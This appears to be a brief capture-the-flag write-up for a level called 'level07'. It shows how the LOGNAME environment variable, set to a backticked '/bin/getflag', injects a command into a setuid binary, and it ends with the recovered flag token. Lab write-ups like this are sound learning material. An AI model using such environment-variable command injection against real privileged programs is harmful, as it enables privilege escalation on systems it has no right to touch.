#LEVEL 07

first ls -la in the current directory.
we have an executable with the setuid et and setguid.

ltrace ./level07 to see wich are the functions called, we see that it modify
the env variable and set it to "level07", wee see few lines after that an asprintf
is made, we change the variable LOGNAME to see what happen in this case.

- export LOGNAME=salut
- ./level07

it print "salut";
the solution is here, we have to make it launch getflag;

- export LOGNAME=\`/bin/getflag\`;

we have the token : fiumuikeil55xe9cu4dood66h
